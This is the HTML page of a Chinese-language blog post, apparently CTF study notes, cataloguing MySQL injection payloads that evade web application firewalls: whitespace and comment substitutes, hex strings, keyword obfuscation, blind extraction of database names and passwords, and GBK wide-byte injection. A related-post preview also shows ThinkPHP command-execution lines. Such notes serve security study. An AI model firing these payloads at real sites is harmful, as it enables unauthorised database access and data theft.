@@ -1,0 +1,307 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sql注入绕过 | 向每个梦想加速</title><meta name="author" content="向每个梦想加速"><meta name="copyright" content="向每个梦想加速"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="空格绕过、引号绕过、逗号绕过、比较符号绕过、or和and绕过、注释绕过、等号绕过、关键字union_select_where绕过、通用绕过、等价函数绕过、宽字节注入。 空格绕过 +（加号，尤其是URL中） %09（URL编码的制表符，Tab） %0a（换行符\n） %0b（垂直制表符） %0c（换页符） %0d（回车符） &#x2F;**&#x2F; (多行注释) () (括号)在MySQL中，括号是用来包围子查询的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入绕过">
+<meta property="og:url" content="http://example.com/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="向每个梦想加速">
+<meta property="og:description" content="空格绕过、引号绕过、逗号绕过、比较符号绕过、or和and绕过、注释绕过、等号绕过、关键字union_select_where绕过、通用绕过、等价函数绕过、宽字节注入。 空格绕过 +（加号，尤其是URL中） %09（URL编码的制表符，Tab） %0a（换行符\n） %0b（垂直制表符） %0c（换页符） %0d（回车符） &#x2F;**&#x2F; (多行注释) () (括号)在MySQL中，括号是用来包围子查询的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/touxiang.png">
+<meta property="article:published_time" content="2025-04-14T10:09:24.000Z">
+<meta property="article:modified_time" content="2025-04-14T10:10:37.644Z">
+<meta property="article:author" content="向每个梦想加速">
+<meta property="article:tag" content="sql注入绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/touxiang.png"><link rel="shortcut icon" href="/img/urltouxiang.png"><link rel="canonical" href="http://example.com/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql注入绕过',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/beijing.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">向每个梦想加速</span></a><a class="nav-page-title" href="/"><span class="site-name">sql注入绕过</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sql注入绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-14T10:09:24.000Z" title="发表于 2025-04-14 18:09:24">2025-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-14T10:10:37.644Z" title="更新于 2025-04-14 18:10:37">2025-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>空格绕过、引号绕过、逗号绕过、比较符号绕过、or和and绕过、注释绕过、等号绕过、关键字union_select_where绕过、通用绕过、等价函数绕过、宽字节注入。</p>
+<h2 id="空格绕过">空格绕过</h2>
+<p><code>+</code>（加号，尤其是URL中）</p>
+<p><code>%09</code>（URL编码的制表符，Tab）</p>
+<p><code>%0a</code>（换行符\n）</p>
+<p><code>%0b</code>（垂直制表符）</p>
+<p><code>%0c</code>（换页符）</p>
+<p><code>%0d</code>（回车符）</p>
+<p><code>/**/</code> (多行注释)</p>
+<p><code>()</code> (括号)在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>时间time based盲注当中常见括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>
+<h2 id="引号绕过">引号绕过</h2>
+<p>十六进制绕过引号 	eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot;--+</span><br></pre></td></tr></table></figure>
+<p>我们避免不了使用引号，使用十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+</span><br></pre></td></tr></table></figure>
+<p>为什么可以使用十六进制？<br>
+<strong>MySQL能识别十六进制编码</strong>，因为<strong>在MySQL里，十六进制字面量</strong>（像<code>0x75736572</code>）<strong>是合法的表达式</strong>，而且<strong>可以直接当作字符串或者数字使用</strong>。</p>
+<h2 id="逗号绕过">逗号绕过</h2>
+<p>使用盲注Blind的时候会用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr(str, start, length)</span><br><span class="line"></span><br><span class="line">mid(str, start, length)</span><br></pre></td></tr></table></figure>
+<p>这两个函数，他们都会用到逗号	eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line"></span><br><span class="line">select substr(database(), 0, 1);</span><br><span class="line">select mid(database(), 0, 1);</span><br></pre></td></tr></table></figure>
+<p>我们可以用from for</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+<p>为什么？</p>
+<p>MySQL设计<code>substr()</code>和<code>mid()</code>的时候就规定了<strong>两种语法</strong>。</p>
+<p>​	<code>	substr(str, pos, len)</code>是标准SQL。</p>
+<p>​	<code>substr(str from pos for len)</code>是<strong>MySQL兼容</strong>的另一种写法。</p>
+<p>补充:</p>
+<p>1.limit也会用到逗号	eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 1 OFFSET 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LIMIT start, length</span><br><span class="line">LIMIT start OFFSET length</span><br><span class="line"></span><br><span class="line">SELECT * FROM users LIMIT 5;</span><br><span class="line">取最前面 5 条记录。</span><br><span class="line"></span><br><span class="line">SELECT * FROM users LIMIT 5 OFFSET 10;</span><br><span class="line">跳过前面 10 条记录，然后取 5 条。</span><br><span class="line"></span><br><span class="line">LIMIT 5 OFFSET 10</span><br><span class="line">等价于limit 10，5</span><br></pre></td></tr></table></figure>
+<p>2.substr(str FROM start FOR length)	eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(database() from 1 for 1)</span><br><span class="line">从 database() 结果的第 1 个字符开始，取1个字符。</span><br></pre></td></tr></table></figure>
+<p>我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr(database(from1for1));</span><br><span class="line">和</span><br><span class="line">substr(database(0from1for1));</span><br><span class="line">其中0可以忽略，相当于填充/绕过</span><br><span class="line">有些WAF拦关键字 from，但是遇到 0from 就不认识了，可以轻微绕过。</span><br></pre></td></tr></table></figure>
+<h2 id="比较符号绕过">比较符号绕过</h2>
+<p>盲注时可能会用到二分法查找，这时候我们需要用到大小于号	eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+<h2 id="or-and-绕过">or and 绕过</h2>
+<p>and=&amp;&amp; or=||</p>
+<h2 id="注释绕过">注释绕过</h2>
+<p>一般我们的SQL注入最后要加注释符（<code>--+</code> / <code>#</code>）来注释掉原SQL尾巴，但是注释被waf了，怎么办？</p>
+<p>1.补齐语法，骗过后半部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原本</span><br><span class="line">select * from users where id=&#x27;$id&#x27; and status=&#x27;1&#x27;</span><br><span class="line">注入</span><br><span class="line">1&#x27; and 1=1 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">拼接起来就是</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 and &#x27;1&#x27;=&#x27;1&#x27; and status=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">在你的payload最后补一个&#x27;或&quot;,让整个SQL闭合；</span><br><span class="line">然后正常继续后面的SQL，避免错误。</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>利用括号包住注入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">?id=1&#x27;) and (1=1) and (&#x27;1&#x27;=&#x27;1</span><br><span class="line">拼接起来就是</span><br><span class="line">select * from users where id=&#x27;1&#x27;) and (1=1) and (&#x27;1&#x27;=&#x27;1&#x27; and status=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>用逻辑分隔符 <code>OR</code> / <code>AND</code> 尾部自然结束</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">?id=1&#x27; or 1=1 or &#x27;1&#x27;=&#x27;2</span><br><span class="line">拼接</span><br><span class="line">select * from users where id=&#x27;1&#x27; or 1=1 or &#x27;1&#x27;=&#x27;2&#x27; and status=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="等于号绕过">等于号绕过</h2>
+<p>关键是：like或者大小于号</p>
+<table>
+<thead>
+<tr>
+<th>技巧</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. <code>&lt;=&gt;</code>（空安全等号）</td>
+<td><code>1&lt;=&gt;1</code></td>
+<td><code>&lt;=&gt;</code> 是MySQL的“安全等于”，跟<code>=</code>作用一模一样！</td>
+</tr>
+<tr>
+<td>2. <code>like</code>代替<code>=</code></td>
+<td><code>username like 'admin'</code></td>
+<td><code>like</code> 代替比较，效果一样</td>
+</tr>
+<tr>
+<td>3. <code>regexp</code>代替</td>
+<td><code>username regexp 'admin'</code></td>
+<td>用正则匹配代替比较</td>
+</tr>
+<tr>
+<td>4. <code>between</code>代替</td>
+<td><code>1 between 1 and 1</code></td>
+<td><code>between a and b</code> 其实就是 a &lt;= x &lt;= b</td>
+</tr>
+<tr>
+<td>5. <code>instr()</code>函数</td>
+<td><code>instr(database(),'ctf')&gt;0</code></td>
+<td><code>instr</code>返回字符串位置，结果&gt;0表示包含</td>
+</tr>
+<tr>
+<td>6. <code>strcmp()</code>函数</td>
+<td><code>strcmp('admin',username)=0</code></td>
+<td>相等返回0，绕过直接比较</td>
+</tr>
+<tr>
+<td>7. <code>case when then</code>逻辑</td>
+<td><code>case when 1 then 1 else 2 end</code></td>
+<td>条件判断，等于的时候返回</td>
+</tr>
+</tbody>
+</table>
+<h2 id="union、select、where绕过">union、select、where绕过</h2>
+<p>1.注释绕过</p>
+<p>//，-- , /**/, #, --+, – -, ;,%00,–a</p>
+<p>U/**/NION</p>
+<p>2.大小写绕过</p>
+<p>UNioN</p>
+<p>3.内联注释绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!UnIoN*/</span><br></pre></td></tr></table></figure>
+<p><code>/*!*/</code> 是一种<strong>版本注释</strong>，只有<strong>MySQL 5.0以上版本</strong>会执行被注释的内容。</p>
+<p><strong>MySQL 5.0以下的版本会忽略注释内容</strong>，所以这种注释写法主要是为了绕过WAF和进行兼容性测试。</p>
+<p><strong>绕过过滤机制</strong>：许多WAF和防火墙会拦截常见的SQL关键字，比如 <code>SELECT</code>、<code>UNION</code>、<code>INSERT</code>等。如果你把这些关键字包裹在 <code>/*!50000SELECT*/</code> 这样的版本注释中，<strong>WAF不会识别注释内容为关键字</strong>，因此会允许通过。</p>
+<p><strong>版本特性</strong>：<code>/*!*/</code> 的版本注释会在MySQL <strong>5.0及以上版本执行</strong>。例如，<code>/*!50000SELECT*/</code> 只有MySQL 5.0及以上的版本会执行，而<strong>MySQL 5.0以下的版本会忽略这个注释内容</strong>，这样就可以利用版本控制来选择是否执行某些SQL语句。</p>
+<p>4.双写绕过</p>
+<p>ununionion</p>
+<h2 id="通用绕过">通用绕过</h2>
+<p>URLEncode<strong>编码</strong>，ASCII,HEX,unicode编码绕过</p>
+<p>有时WAF会过滤常见的 <code>SELECT</code> 或 <code>UNION</code>，我们可以使用<strong>子查询</strong>来绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from users where username=&#x27;admin&#x27;)--</span><br></pre></td></tr></table></figure>
+<p>这通过子查询来避免了 <code>UNION</code> 的使用。</p>
+<h2 id="等价函数绕过">等价函数绕过</h2>
+<p>hex()、bin()==&gt;ascii()</p>
+<p>sleep()==&gt;benchmark()</p>
+<p>concat_ws()==&gt;group_concat()</p>
+<p>mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">substring()和substr()无法使用时：</span><br><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</span><br><span class="line">或者：</span><br><span class="line">substr((select&#x27;password&#x27;),1,1)=0x70strcmp(left(&#x27;password&#x27;,1),0x69)=1strcmp(left(&#x27;password&#x27;,1),0x70)=0strcmp(left(&#x27;password&#x27;,1),0x71)=-1</span><br></pre></td></tr></table></figure>
+<h2 id="宽字节注入">宽字节注入</h2>
+<p>先了解一下waf原理：<br>
+waf会把引号进行转义例如我们传入的单引号会被变成反斜杠加一个单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  ====&gt;  \&#x27;</span><br></pre></td></tr></table></figure>
+<p>这时我们就要用到宽字节注入了(通俗来讲就是把他的反斜杠给变成其他东西)</p>
+<p>宽字节注入出现的条件：<strong>多字节编码环境下</strong>（特别是 <strong>GBK、GB2312、Big5</strong> 这些中文编码）</p>
+<p>举个简单的例子：</p>
+<ul>
+<li>正常情况下，我们输入：<code>'</code></li>
+<li>服务器可能会过滤或转义 <code>'</code>，防止注入。</li>
+</ul>
+<p>但是！如果服务器是 <strong>GBK编码</strong>，而我们提交的 <code>'</code> 后面跟了一个 <strong>0xBF</strong> 这样的字节（GBK里合法的第二字节范围是 0x40~0xFE），<strong>数据库就会把它们一起当成一个&quot;中文字符&quot;来处理</strong>，不会单独识别 <code>'</code>。</p>
+<p>于是：</p>
+<ul>
+<li><code>' + 0xbf</code> → 被解析为一个合法的GBK字符</li>
+<li>引号 <code>'</code> <strong>就失效了！</strong></li>
+<li>后面你就可以接着注入任意SQL代码了。</li>
+</ul>
+<p>关键就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%bf&#x27;、%df&#x27;、%ff&#x27;</span><br></pre></td></tr></table></figure>
+<p>%bf和反斜杠结合会变成中文，然后会把单引号给露出来。</p>
+<p>当我们发现我们的sql语句当中任何闭合符号都不行，就需要采用宽字节注入来进行闭合了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">向每个梦想加速</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">http://example.com/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">向每个梦想加速</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">sql注入绕过</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/14/ThinkPHP/" title="ThinkPHP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ThinkPHP</div></div><div class="info-2"><div class="info-item-1">前置知识 ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。PHP 框架像是一个工具箱，提供了开发 web 应用所需的所有基本工具，帮助开发者更快速、更安全地完成开发任务。 1http://serverName/index.php/模块/控制器/操作 web569 /index.php/admin/login/ctfshowlogin web570 有一个闭包函数 123&#x27;ctfshow/:f/:a&#x27; =&gt;function($f,$a)&#123;    call_user_func($f, $a);&#125; 123/index.php/ctfshow/assert/assert($_POST[&#x27;zmr&#x27;])zmr=system(&#x27;ls&#x27;); web571 没有直接给后门什么的 但是有一个  没有定义位置，这是一个thinkphp自带的函数，我们去前置知识看看   意思就是他可以解析我们的代码 1?n=&lt;?php system(&#x27;cat...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">向每个梦想加速</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://user.qzone.qq.com/2325525993"><i class="fas fa-envelope"></i><span>qq空间</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">qq2325525993</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">引号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">逗号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">比较符号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#or-and-%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">or and 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">注释绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">等于号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union%E3%80%81select%E3%80%81where%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">union、select、where绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">通用绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">等价函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">宽字节注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="sql注入绕过">sql注入绕过</a><time datetime="2025-04-14T10:09:24.000Z" title="发表于 2025-04-14 18:09:24">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/ThinkPHP/" 